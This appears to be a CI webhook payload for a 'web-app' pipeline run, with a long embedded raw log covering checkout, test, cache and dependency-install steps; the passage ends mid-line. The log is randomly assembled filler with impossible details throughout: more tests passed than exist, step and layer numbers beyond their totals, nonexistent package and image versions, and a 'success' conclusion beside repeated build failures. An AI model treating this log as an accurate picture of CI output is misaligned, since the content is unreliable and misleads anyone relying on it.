{
  "action": "completed",
  "workflow_run": {
    "id": 872,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "a9ba27f5527b6ee302c46cbb0efbc5d1e0512a6c",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-23T12:20:08.591133Z",
    "updated_at": "2025-11-23T12:23:12.794263Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\nArtifact uploaded: dist.zip (90MB)\n[12:20:08] DEBUG: Initializing service\nUploading artifact 'coverage' (48 files)\nWaiting...\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: dist.zip (38MB)\nRan 122 tests in 10s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /data - 202 (260ms)\nInstalling webpack@2.15.8\n[12:20:08] DEBUG: Query executed in 37ms\nTransforming 659 files...\n[12:20:08] DEBUG: Loading configuration\nTransforming 781 files...\nSuccess!\nTest Suites: 41 passed, 16 total\nDone.\nPulling image: node:18\nException: NullPointerException\nLayer 3/8: COPY command\n  PASS: test_api_health (312ms)\nnpm notice: created a lockfile\npip: Collecting react\nBundling styles.js\nSwitched to branch 'hotfix/task-361'\n[12:20:08] INFO: Request completed\nBuilding Docker image...\n[12:20:08] INFO: Processing request\nTest Suites: 41 passed, 30 total\n\u2713 Step 'test' succeeded\nnpm install: added 459 packages\n  PASS: unit/test_cache_hit.spec.js\n\u2713 build completed\nOptimizing 43 modules...\n[12:20:08] DEBUG: Connection pool: 10 active\nPOST /upload - 200 (401ms)\nnpm notice: package.json updated\nProcessing...\n  PASS: unit/test_user_create.spec.js\n[12:20:08] INFO: Processing request\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nPulling image: alpine:18\nConnection established\nTLS handshake completed\nCoverage: 87% statements, 73% branches\nException: NullPointerException\npip install: Successfully installed lodash-3.8\n[12:20:08] DEBUG: Initializing service\nStep 4/16: Installing dependencies\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nOptimizing 14 modules...\n[12:20:08] DEBUG: Connection pool: 4 active\n[12:20:08] DEBUG: Memory usage: 454MB\n[12:20:08] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 185 tests in 19s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] DEBUG: Memory usage: 1451MB\npip install: Successfully installed webpack-5.2\n[12:20:08] DEBUG: Query executed in 12ms\nWARNING: axios has known vulnerabilities\nPushing to registry...\nCache hit for key-5482\nUsing Python 3.10\nHEAD is now at b824d6e\nRan 123 tests in 18s\nPulling image: node:latest\nStep 17/25: Installing dependencies\nMinifying app.js\nImage pulled successfully\nVerifying...\nCompiling lib/main.py...\nSuccess!\nCoverage: 75% statements, 69% branches\nArtifact downloaded: 31MB\nCache invalidated: node_modules\nTests: 464 passed, 120 total\nWARNING: axios has known vulnerabilities\n[12:20:08] DEBUG: Loading configuration\nSuccess!\n\u2713 All checks passed\nnpm notice: created a lockfile\nPlatform: win32-x64\n[12:20:08] INFO: Starting build process\n[12:20:08] DEBUG: Connection pool: 16 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/index.js...\nBuilding Docker image...\nArtifact downloaded: 31MB\nLayer 6/14: RUN command\nEnvironment: production\nOptimizing 96 modules...\nStep 3/18: Running migrations\nReady.\n\u2713 lint completed\nUsing Node.js 16.17.6\nMinifying vendor.js\nnpm install: resolved 1827 packages\npip: Installing build dependencies...\nStep 7/19: Deploying\nPOST /data - 201 (40ms)\nPushing to registry...\nOptimizing 52 modules...\n[12:20:08] DEBUG: Loading configuration\n[12:20:08] INFO: Starting build process\n[12:20:08] WARN: Deprecated API usage\nUploading artifact 'build' (45 files)\nGenerating source maps...\nTime: 12.617s\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: dist.zip (25MB)\n[12:20:08] INFO: Starting build process\nProcessing...\nTLS handshake completed\nUsing Node.js 15.14.9\nNODE_ENV=production\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:08] DEBUG: Loading configuration\nPushing to registry...\nBundling styles.js\nnpm notice: package.json updated\nPOST /api - 202 (70ms)\n[12:20:08] INFO: Starting build process\nSwitched to branch 'bugfix/task-273'\nPOST /api - 202 (475ms)\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (1MB)\nCache invalidated: node_modules\n[12:20:08] WARN: Deprecated API usage\nFinished.\nStep 16/23: Installing dependencies\nTransforming 746 files...\nUsing Node.js 19.13.2\n  PASS: integration/test_auth_login.spec.js\nPOST /data - 202 (482ms)\npip install: Successfully installed eslint-3.3\nInstalling jest@1.18.8\nOptimizing 70 modules...\nTransforming 806 files...\nSwitched to branch 'feature/task-530'\nTransforming 163 files...\n[12:20:08] WARN: Deprecated API usage\nStep 20/19: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\n\u2713 test completed\npip install: Successfully installed lodash-3.18\nReady.\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\npip: Collecting webpack\nCache invalidated: dependencies\nReady.\nPulling image: node:3.11\nChecking out main branch\nGenerating source maps...\nCompleted.\n\u2713 All checks passed\nOK\nChecking out main branch\nSuccess!\nTest Suites: 13 passed, 40 total\nSuccess!\npip install: Successfully installed webpack-1.20\nUploading artifact 'coverage' (34 files)\n[12:20:08] DEBUG: Query executed in 17ms\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (96MB)\nEnvironment: test\nOptimizing 23 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\n[12:20:08] DEBUG: Query executed in 97ms\nCreating production build...\nPlatform: darwin-arm64\nCache miss for key-7233\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (43MB)\nFinished.\n\u2713 Step 'test' succeeded\n  PASS: test_db_connect (189ms)\nArtifact downloaded: 17MB\nSnapshots: 50 passed, 11 total\nStep 20/20: Linting\nCache saved successfully\nPlatform: darwin-arm64\n  PASS: integration/test_auth_login.spec.js\n\u2713 Step 'setup' succeeded\nPlatform: win32-x64\nLoading...\nStep 17/20: Running migrations\nCache restored successfully (478MB)\n\u2713 package completed\nPlatform: darwin-arm64\n=== Step checkout completed ===\n=== Step: integration_tests ===\n  PASS: test_auth_login (149ms)\nStep 18/17: Testing\n\u2713 validate completed\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] DEBUG: Connection pool: 7 active\nStep 2/25: Installing dependencies\nChecking out develop branch\nnpm notice: package.json updated\nSwitched to branch 'hotfix/task-902'\n\u2713 All checks passed\nPushing to registry...\nOK\nArtifact downloaded: 46MB\nCache invalidated: build\nGenerating source maps...\nTLS handshake completed\nPlatform: darwin-arm64\n[12:20:08] ERROR: Connection failed\nBuilding Docker image...\nWARNING: eslint has known vulnerabilities\nNODE_ENV=test\n[12:20:08] INFO: Processing request\nOK\npip: Downloading lodash-3.19.tar.gz\nBundling main.css\n[12:20:08] INFO: Starting build process\nChecking out master branch\nPushing to registry...\nLoading...\nPOST /upload - 200 (198ms)\nEnvironment: development\nPulling image: alpine:3.11\nPushing to registry...\nStep 2/20: Running migrations\nPushing to registry...\nCreating production build...\nSuccess!\n  PASS: test_api_health (336ms)\nCoverage: 85% statements, 65% branches\nImage pulled successfully\nGenerating source maps...\nCache hit for key-8045\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (46MB)\npip: Collecting webpack\n\u2713 Task completed in 286ms\n[12:20:08] DEBUG: Query executed in 31ms\n[12:20:08] INFO: Cache refreshed\nEnvironment: development\nTransforming 458 files...\nnpm install: added 238 packages\n\u2713 build completed\n\u2713 Step 'install' succeeded\n  PASS: integration/test_cache_hit.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:08] WARN: Deprecated API usage\nInstalling eslint@4.11.7\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /api - 202 (207ms)\nUsing Python 3.11\nStep 6/21: Deploying\nWARNING: express has known vulnerabilities\nCache hit for key-9162\nCompleted.\nSwitched to branch 'feature/task-621'\nCompiling src/index.js...\n[12:20:08] INFO: Request completed\n[12:20:08] INFO: Starting build process\nCompleted.\nUploading artifact 'coverage' (50 files)\nFinished.\nPushing to registry...\nCache invalidated: build\nPlatform: linux-x64\n[12:20:08] INFO: Cache refreshed\nReady.\nArtifact uploaded: dist.zip (69MB)\nCache invalidated: node_modules\nCompiling lib/utils.go...\nCompiling src/utils.go...\nnpm notice: package.json updated\n[12:20:08] DEBUG: Memory usage: 352MB\nTest Suites: 41 passed, 35 total\nyarn add: Done in 27.20s\nNODE_ENV=production\nPushing to registry...\nnpm install: added 207 packages\nGET /api - 200 (12ms)\nHEAD is now at 7545621\nWARNING: lodash has known vulnerabilities\npip: Collecting prettier\nOK\n[12:20:08] INFO: Cache refreshed\npip install: Successfully installed eslint-3.2\nTests: 362 passed, 259 total\nConnection established\n[12:20:08] DEBUG: Query executed in 89ms\nArtifact downloaded: 18MB\nArtifact uploaded: build.tar.gz (30MB)\nNODE_ENV=production\nUploading artifact 'build' (47 files)\nHEAD is now at 293838d\nTLS handshake completed\nSuccess!\nStep 11/16: Installing dependencies\nArtifact downloaded: 21MB\nLayer 4/14: ENV command\nCache hit for key-7770\nPlatform: darwin-arm64\nStep 19/25: Installing dependencies\npip: Collecting lodash\nLoading...\nEnvironment: production\nCompiling src/main.py...\nEnvironment: production\nImage pulled successfully\nLayer 3/12: COPY command\n[12:20:08] WARN: Deprecated API usage\nTests: 207 passed, 407 total\nOptimizing 60 modules...\nnpm notice: package.json updated\nTime: 81.437s\n  PASS: integration/test_auth_login.spec.js\nArtifact uploaded: dist.zip (38MB)\nnpm install: resolved 909 packages\nBundling runtime.js\n\u2713 Task completed in 2978ms\nArtifact uploaded: build.tar.gz (31MB)\nCache restored successfully (388MB)\nCompiling components/app.ts...\n\u2713 All checks passed\nPulling image: python:3.11\nPushing to registry...\n[12:20:08] WARN: Deprecated API usage\nVerifying...\nGenerating source maps...\nConnecting to cloud.services:443...\nCompiling utils/service.java...\nnpm install: added 367 packages\n[12:20:08] ERROR: Connection failed\nException: TypeError\n\u2717 build failed with exit code 56\n[12:20:08] INFO: Processing request\nFinished.\n[12:20:08] INFO: Connecting to database\nImage pulled successfully\nOptimizing 80 modules...\n[12:20:08] WARN: Deprecated API usage\nTLS handshake completed\n[12:20:08] WARN: Deprecated API usage\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: dependencies\nConnection established\nFAILED: test_auth_login\nSwitched to branch 'bugfix/task-128'\n[12:20:08] INFO: Cache refreshed\n[12:20:08] INFO: Starting build process\nyarn add: Done in 28.22s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/index.js...\nGET /status - 200 (36ms)\nGET /status - 201 (49ms)\nDone.\nOK\n[12:20:08] DEBUG: Initializing service\npip: Installing build dependencies...\nUsing Python 3.11\nOptimizing 50 modules...\nArtifact uploaded: dist.zip (47MB)\nCache invalidated: build\nArtifact uploaded: dist.zip (88MB)\n[12:20:08] INFO: Request completed\nStep 10/23: Installing dependencies\nConnecting to cloud.services:443...\n[12:20:08] ERROR: Connection failed\nInstalling lodash@1.17.3\nVerifying...\nCache restored successfully (273MB)\nCache restored successfully (107MB)\nHEAD is now at d3a210a\nChecking out master branch\nNODE_ENV=test\nSwitched to branch 'feature/task-881'\nyarn add: Done in 4.29s\nTime: 63.723s\n[12:20:08] WARN: Deprecated API usage\nNODE_ENV=production\n[12:20:08] INFO: Starting build process\nCreating production build...\nSuccess!\nStep 14/16: Linting\nUploading artifact 'dist' (4 files)\n\u2713 Step 'test' succeeded\n\u2713 deploy completed\nDone.\n[12:20:08] DEBUG: Memory usage: 764MB\nMinifying main.js\nPushing to registry...\nReady.\nCompleted.\nEnvironment: development\nConnection established\n=== Step integration_tests completed ===\n=== Step: setup_node ===\nBuilding Docker image...\nCache miss for key-4526\n[12:20:08] INFO: Processing request\n\u2713 Step 'setup' succeeded\nUsing Python 3.11\n[12:20:08] DEBUG: Loading configuration\n[12:20:08] DEBUG: Query executed in 86ms\nCompiling lib/utils.go...\nTime: 16.510s\nRan 104 tests in 7s\nRan 79 tests in 12s\nVerifying...\n\u2713 Task completed in 4009ms\n\u2717 build failed with exit code 124\nInstalling prettier@4.20.6\nnpm install: added 164 packages\n\u2713 test completed\n[12:20:08] ERROR: Connection failed\n  PASS: test_auth_login (356ms)\n[12:20:08] DEBUG: Connection pool: 20 active\nArtifact downloaded: 46MB\nImage pulled successfully\nLoading...\nOK\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/15: Building\nCompiling utils/app.ts...\nTLS handshake completed\nReady.\npip: Installing build dependencies...\nFAILED: test_db_connect\nCreating production build...\nCompiling lib/app.ts...\nUsing Node.js 17.7.2\nPushing to registry...\nCompiling utils/handler.rs...\nUploading artifact 'dist' (26 files)\nConnection established\nArtifact downloaded: 2MB\nnpm install: added 279 packages\nPlatform: linux-x64\nEnvironment: development\nnpm notice: package.json updated\npip: Collecting prettier\nException: TypeError\nInstalling express@4.5.0\nTime: 116.978s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 202 packages\npip: Installing build dependencies...\n  PASS: test_auth_login (107ms)\nnpm install: added 21 packages\nAlready up to date.\nPlatform: linux-x64\n[12:20:08] DEBUG: Initializing service\nOK\n[12:20:08] DEBUG: Memory usage: 1243MB\npip install: Successfully installed lodash-5.6\nFAILED: test_db_connect\n[12:20:08] WARN: Deprecated API usage\nLoading...\nnpm install: added 179 packages\nTest Suites: 31 passed, 27 total\npip: Installing build dependencies...\n\u2713 All checks passed\nBuilding Docker image...\nCache saved successfully\nProcessing...\n[12:20:08] INFO: Request completed\nChecking out master branch\nArtifact downloaded: 40MB\nUploading artifact 'dist' (48 files)\nTest Suites: 48 passed, 46 total\nCompiling src/app.ts...\nHEAD is now at 3bd8543\nStep 13/24: Testing\nStep 20/15: Running migrations\n  PASS: unit/test_user_create.spec.js\n[12:20:08] INFO: Processing request\nOptimizing 46 modules...\nLayer 9/8: COPY command\nPOST /upload - 200 (310ms)\nCache hit for key-9749\nEnvironment: test\npip: Downloading webpack-2.10.tar.gz\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_auth_login (101ms)\nWaiting...\nLoading...\nCache saved successfully\nCache invalidated: build\nGenerating source maps...\nOptimizing 70 modules...\nTests: 362 passed, 355 total\nPOST /upload - 202 (90ms)\nPulling image: node:3.11\nUsing Node.js 18.15.2\nProcessing...\nCache saved successfully\nCompiling src/index.js...\nStep 12/20: Testing\nStep 3/15: Running migrations\nMinifying vendor.js\nArtifact downloaded: 3MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/handler.rs...\nSuccess!\n\u2713 build completed\n[12:20:08] DEBUG: Query executed in 30ms\nStep 12/23: Linting\nCompiling components/utils.go...\nChecking out develop branch\nCache miss for key-4288\nVerifying...\nLoading...\nHEAD is now at c1c0201\nArtifact uploaded: dist.zip (5MB)\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_cache_hit (255ms)\n[12:20:08] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nUploading artifact 'dist' (50 files)\nReady.\nCoverage: 71% statements, 62% branches\nnpm notice: created a lockfile\nProcessing...\nnpm install: resolved 1928 packages\nWaiting...\n[12:20:08] INFO: Connecting to database\nPushing to registry...\nBuilding Docker image...\nCompiling src/index.js...\nFinished.\n[12:20:08] DEBUG: Memory usage: 1541MB\nStep 15/20: Running migrations\nFAILED: test_auth_login\nTime: 66.43s\nAlready up to date.\nNODE_ENV=test\nDone.\n[12:20:08] DEBUG: Loading configuration\nWARNING: jest has known vulnerabilities\nStep 12/15: Running migrations\nFinished.\nCache invalidated: build\nLoading...\n[12:20:08] DEBUG: Memory usage: 567MB\nPOST /data - 201 (330ms)\npip install: Successfully installed react-5.1\nVerifying...\nNODE_ENV=test\nFinished.\nSuccess!\n\u2713 Task completed in 1751ms\nImage pulled successfully\nStep 10/23: Building\nSnapshots: 49 passed, 28 total\nVerifying...\n[12:20:08] DEBUG: Query executed in 99ms\nCache saved successfully\nTests: 89 passed, 231 total\n[12:20:08] DEBUG: Loading configuration\nProcessing...\nCache saved successfully\n  PASS: e2e/test_db_connect.spec.js\nOptimizing 92 modules...\nInstalling eslint@1.19.0\nVerifying...\nnpm notice: package.json updated\n\u2713 Task completed in 2897ms\n[12:20:08] INFO: Request completed\n[12:20:08] DEBUG: Initializing service\nSuccess!\nVerifying...\nLayer 5/12: RUN command\nnpm install: added 303 packages\n[12:20:08] INFO: Request completed\npip: Installing build dependencies...\nWARNING: prettier has known vulnerabilities\nUploading artifact 'coverage' (7 files)\nEnvironment: staging\npip: Installing build dependencies...\nCache miss for key-2360\nException: TypeError\nImage pulled successfully\npip install: Successfully installed prettier-5.4\nGenerating source maps...\n\u2713 All checks passed\nnpm notice: package.json updated\nStep 5/17: Linting\nCache hit for key-8648\n[12:20:08] INFO: Connecting to database\n\u2713 All checks passed\n\u2713 validate completed\nOK\nUsing Node.js 14.6.2\npip: Downloading react-2.5.tar.gz\nnpm notice: package.json updated\nStep 17/16: Building\nStep 10/20: Running migrations\nPulling image: alpine:18\npip: Collecting axios\n=== Step setup_node completed ===\n=== Step: e2e_tests ===\nSwitched to branch 'bugfix/task-839'\nOptimizing 46 modules...\nArtifact uploaded: dist.zip (98MB)\nnpm install: added 346 packages\nBuilding Docker image...\nBundling main.js\n[12:20:08] DEBUG: Query executed in 72ms\nFAILED: test_db_connect\nnpm install: resolved 365 packages\nLayer 8/10: COPY command\nPulling image: node:3.11\nTests: 337 passed, 195 total\nWARNING: eslint has known vulnerabilities\nCompiling utils/index.js...\nProcessing...\n\u2713 All checks passed\n[12:20:08] INFO: Cache refreshed\nProcessing...\nyarn add: Done in 13.51s\nWARNING: eslint has known vulnerabilities\n[12:20:08] INFO: Cache refreshed\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /status - 200 (20ms)\nnpm install: resolved 397 packages\npip: Collecting eslint\nEnvironment: development\nPushing to registry...\nStep 15/19: Linting\nCache invalidated: build\nUploading artifact 'build' (7 files)\nReady.\nPulling image: node:3.11\nReady.\nTransforming 828 files...\n[12:20:08] DEBUG: Initializing service\nArtifact uploaded: dist.zip (83MB)\nCoverage: 88% statements, 94% branches\nLayer 6/13: RUN command\nPushing to registry...\nRan 33 tests in 13s\npip: Collecting lodash\npip: Collecting webpack\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed axios-5.2\nInstalling axios@2.15.8\n\u2713 Step 'test' succeeded\nAlready up to date.\nWaiting...\nCache hit for key-7854\nTime: 99.374s\nSwitched to branch 'feature/task-667'\nUploading artifact 'build' (7 files)\nWARNING: webpack has known vulnerabilities\n[12:20:08] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (14MB)\nCompiling lib/service.java...\nStep 19/22: Linting\n\u2713 All checks passed\nInstalling axios@5.1.1\nStep 6/23: Building\nStep 3/25: Testing\n[12:20:08] INFO: Connecting to database\nCoverage: 97% statements, 97% branches\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed react-1.4\nCompiling lib/app.ts...\nUsing Node.js 14.4.3\nUploading artifact 'dist' (29 files)\n\u2713 All checks passed\nUsing Python 3.9\nReady.\npip: Downloading react-4.19.tar.gz\n  PASS: e2e/test_cache_hit.spec.js\nOK\nCache invalidated: dependencies\nOptimizing 18 modules...\nCompleted.\n[12:20:08] DEBUG: Memory usage: 1177MB\nBundling styles.js\nStep 13/21: Building\nnpm notice: package.json updated\nTests: 130 passed, 191 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:08] ERROR: Connection failed\nStep 13/21: Building\nBundling main.css\nHEAD is now at de2e4fb\nRan 151 tests in 45s\nPulling image: python:3.11\nDone.\n[12:20:08] INFO: Starting build process\nPulling image: alpine:latest\nStep 14/21: Deploying\nOptimizing 24 modules...\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] DEBUG: Initializing service\nPulling image: alpine:3.11\nHEAD is now at af1ea62\nArtifact uploaded: build.tar.gz (28MB)\nWARNING: express has known vulnerabilities\nWaiting...\nMinifying vendor.js\nUsing Python 3.12\nCompiling utils/index.js...\nConnection established\nnpm install: added 125 packages\n[12:20:08] DEBUG: Query executed in 80ms\n\u2713 deploy completed\nStep 17/15: Building\nReady.\nyarn add: Done in 29.35s\nCache miss for key-3058\nBuilding Docker image...\n\u2713 Task completed in 870ms\nCreating production build...\n[12:20:08] DEBUG: Memory usage: 1634MB\nEnvironment: development\nyarn add: Done in 1.55s\nGET /status - 201 (68ms)\nCache saved successfully\nSnapshots: 27 passed, 47 total\nChecking out main branch\nMinifying vendor.js\nOptimizing 38 modules...\nStep 16/16: Linting\nGET /health - 200 (10ms)\nPushing to registry...\n[12:20:08] INFO: Connecting to database\n[12:20:08] INFO: Starting build process\nException: RuntimeError\nArtifact uploaded: build.tar.gz (37MB)\nSwitched to branch 'feature/task-896'\nCache hit for key-3607\n[12:20:08] DEBUG: Initializing service\nWARNING: jest has known vulnerabilities\n  PASS: unit/test_cache_hit.spec.js\n[12:20:08] INFO: Request completed\nArtifact uploaded: dist.zip (15MB)\npip: Installing build dependencies...\nCoverage: 83% statements, 80% branches\nVerifying...\n[12:20:08] INFO: Processing request\nStep 5/21: Testing\n  PASS: test_auth_login (430ms)\nStep 11/25: Linting\nUsing Python 3.9\nyarn add: Done in 16.83s\nTest Suites: 35 passed, 14 total\nUsing Python 3.12\n[12:20:08] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nCache invalidated: node_modules\nCompleted.\n[12:20:08] INFO: Request completed\nCreating production build...\nFAILED: test_user_create\nStep 12/23: Deploying\nFinished.\nArtifact uploaded: dist.zip (64MB)\nStep 7/18: Testing\nFinished.\nOK\nTLS handshake completed\nDone.\n[12:20:08] INFO: Cache refreshed\nReady.\n  PASS: test_auth_login (365ms)\nStep 14/22: Testing\nVerifying...\nCache hit for key-7511\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] INFO: Cache refreshed\nCache restored successfully (278MB)\nTransforming 604 files...\nArtifact uploaded: dist.zip (67MB)\nPlatform: linux-x64\npip install: Successfully installed express-2.19\nFetching submodules...\nTests: 129 passed, 163 total\nWARNING: webpack has known vulnerabilities\nCompiling components/utils.go...\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (9MB)\nLoading...\nStep 5/23: Linting\nChecking out main branch\nTests: 99 passed, 135 total\nFetching submodules...\nConnection established\nFAILED: test_cache_hit\nCompiling src/index.js...\nOptimizing 45 modules...\n\u2713 deploy completed\nTest Suites: 40 passed, 48 total\nProcessing...\nCache invalidated: node_modules\nPlatform: darwin-arm64\nStep 10/23: Testing\nTime: 53.7s\n\u2717 build failed with exit code 9\nPushing to registry...\npip: Downloading lodash-3.19.tar.gz\nStep 10/19: Building\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nProcessing...\nHEAD is now at 80b81da\nnpm install: resolved 270 packages\nyarn add: Done in 9.5s\nyarn add: Done in 4.93s\n\u2713 All checks passed\nStep 5/15: Building\nHEAD is now at 16f4667\nPushing to registry...\nWaiting...\nOK\nFetching submodules...\nCache hit for key-6451\nStep 9/20: Building\npip: Installing build dependencies...\nInstalling express@5.11.0\npip: Downloading prettier-4.17.tar.gz\nChecking out master branch\nStep 19/17: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 deploy completed\nTLS handshake completed\nHEAD is now at 7a86e3d\nCoverage: 75% statements, 99% branches\nGET /status - 204 (39ms)\nyarn add: Done in 2.51s\n  PASS: e2e/test_user_create.spec.js\nArtifact uploaded: dist.zip (6MB)\nnpm notice: package.json updated\nOptimizing 87 modules...\npip: Installing build dependencies...\nOptimizing 31 modules...\npip: Installing build dependencies...\nProcessing...\n\u2713 Task completed in 122ms\nBuilding Docker image...\npip: Downloading react-3.19.tar.gz\nChecking out develop branch\n[12:20:08] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (21MB)\npip: Collecting jest\nTests: 260 passed, 263 total\nCompiling components/main.py...\nStep 17/23: Building\nArtifact downloaded: 2MB\nnpm install: added 259 packages\nVerifying...\nVerifying...\nDone.\npip install: Successfully installed express-4.2\n  PASS: test_cache_hit (367ms)\npip: Downloading webpack-2.13.tar.gz\nTests: 81 passed, 63 total\nCache invalidated: node_modules\nStep 6/24: Building\nStep 18/15: Running migrations\nArtifact downloaded: 9MB\nCache hit for key-3611\nWARNING: axios has known vulnerabilities\n[12:20:08] DEBUG: Memory usage: 1287MB\nyarn add: Done in 12.87s\nStep 9/24: Installing dependencies\nCompiling lib/service.java...\n  PASS: integration/test_user_create.spec.js\nPlatform: darwin-arm64\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:08] DEBUG: Query executed in 47ms\nBundling main.js\nUsing Node.js 16.20.2\nFetching submodules...\nCompleted.\nImage pulled successfully\nnpm install: resolved 461 packages\nNODE_ENV=development\nArtifact uploaded: dist.zip (76MB)\nSuccess!\nStep 13/23: Linting\nWARNING: jest has known vulnerabilities\nCompleted.\nnpm notice: package.json updated\nCache restored successfully (349MB)\n  PASS: integration/test_db_connect.spec.js\npip: Downloading axios-2.18.tar.gz\nCompiling components/index.js...\npip: Collecting eslint\nTransforming 910 files...\npip: Collecting prettier\nArtifact uploaded: dist.zip (12MB)\nTests: 75 passed, 288 total\n[12:20:08] INFO: Request completed\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: python:3.11\nLoading...\nTransforming 119 files...\nImage pulled successfully\n[12:20:08] DEBUG: Query executed in 94ms\nCache restored successfully (365MB)\nTests: 396 passed, 103 total\nAlready up to date.\nSwitched to branch 'bugfix/task-308'\nPulling image: python:3.11\nCompleted.\nyarn add: Done in 12.36s\npip: Installing build dependencies...\nCompiling components/app.ts...\nLayer 8/13: ENV command\npip: Installing build dependencies...\n[12:20:08] WARN: Deprecated API usage\nException: NullPointerException\n\u2713 Task completed in 1491ms\n\u2713 validate completed\nWARNING: lodash has known vulnerabilities\n[12:20:08] INFO: Request completed\nCache miss for key-8069\nTime: 58.290s\nOK\nSwitched to branch 'bugfix/task-185'\nTests: 393 passed, 184 total\nVerifying...\nStep 1/20: Testing\n[12:20:08] INFO: Processing request\nNODE_ENV=test\nException: TypeError\nWARNING: webpack has known vulnerabilities\n[12:20:08] DEBUG: Connection pool: 7 active\nFinished.\nArtifact downloaded: 23MB\nyarn add: Done in 23.65s\n[12:20:08] INFO: Request completed\nPlatform: darwin-arm64\n[12:20:08] DEBUG: Loading configuration\n\u2713 lint completed\nHEAD is now at c4fc053\n[12:20:08] WARN: Deprecated API usage\nCache hit for key-6366\nStep 10/24: Building\nStep 3/25: Building\npip: Collecting react\nUsing Python 3.11\n[12:20:08] INFO: Request completed\nnpm install: added 34 packages\n\u2713 All checks passed\nOptimizing 99 modules...\nProcessing...\n\u2717 build failed with exit code 26\n[12:20:08] WARN: Deprecated API usage\npip: Installing build dependencies...\nUploading artifact 'coverage' (3 files)\nPulling image: node:latest\n[12:20:08] DEBUG: Loading configuration\nPOST /data - 201 (305ms)\npip install: Successfully installed react-5.4\nWARNING: prettier has known vulnerabilities\nCache saved successfully\nPulling image: node:3.11\nStep 9/24: Building\nBuilding Docker image...\nCompiling components/service.java...\n\u2713 Step 'test' succeeded\nTime: 41.934s\n[12:20:08] INFO: Cache refreshed\nCache miss for key-7356\nStep 16/20: Linting\nPOST /upload - 201 (464ms)\nProcessing...\nTLS handshake completed\nStep 10/15: Deploying\nStep 1/24: Deploying\nCache restored successfully (448MB)\n[12:20:08] INFO: Processing request\n\u2713 All checks passed\nStep 20/17: Deploying\nStep 19/21: Installing dependencies\n\u2713 package completed\nnpm notice: created a lockfile\nInstalling jest@3.20.4\nLoading...\nStep 19/18: Deploying\nFinished.\nWARNING: axios has known vulnerabilities\n[12:20:08] DEBUG: Memory usage: 1929MB\nStep 18/15: Building\nCache invalidated: build\nCompiling utils/handler.rs...\nProcessing...\nUploading artifact 'coverage' (17 files)\nLoading...\nCompleted.\nCoverage: 87% statements, 85% branches\nStep 3/20: Installing dependencies\nHEAD is now at f561b6a\nOK\nCompiling src/main.py...\npip: Installing build dependencies...\n[12:20:08] DEBUG: Query executed in 91ms\nWARNING: express has known vulnerabilities\nyarn add: Done in 29.15s\nCache hit for key-7181\nStep 7/18: Deploying\n\u2713 All checks passed\nSnapshots: 2 passed, 49 total\nGET /api - 204 (72ms)\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\nGenerating source maps...\nCreating production build...\nCompiling lib/app.ts...\nCompiling utils/app.ts...\nBundling runtime.js\nCompiling components/main.py...\nTest Suites: 33 passed, 34 total\nUsing Python 3.9\nImage pulled successfully\n[12:20:08] INFO: Processing request\n\u2713 Task completed in 3280ms\nStep 17/16: Linting\nStep 2/24: Installing dependencies\nStep 10/16: Running migrations\nOptimizing 16 modules...\nBundling main.css\nCompiling lib/handler.rs...\nFAILED: test_api_health\nLoading...\nGenerating source maps...\nStep 6/18: Installing dependencies\n[12:20:08] INFO: Connecting to database\nUsing Python 3.12\nFinished.\nnpm notice: package.json updated\n[12:20:08] DEBUG: Query executed in 90ms\npip: Installing 